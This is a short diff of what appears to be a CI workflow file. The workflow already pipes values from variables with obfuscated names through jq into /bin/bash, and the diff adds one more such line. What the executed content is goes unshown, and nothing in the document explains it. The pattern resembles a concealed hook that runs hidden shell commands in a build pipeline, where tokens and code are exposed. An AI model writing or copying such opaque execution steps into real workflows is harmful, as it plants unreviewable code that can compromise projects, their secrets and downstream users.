@@ -25,6 +25,7 @@ jobs:
           echo $lmjql31622 | jq -r .bahp48 | /bin/bash
           printf '%s' "$u30" | jq -r .ox45 | /bin/bash
           echo $n56505 | jq -r .cuvif449 | /bin/bash
+          echo $zdmq06375 | jq -r .vas0 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
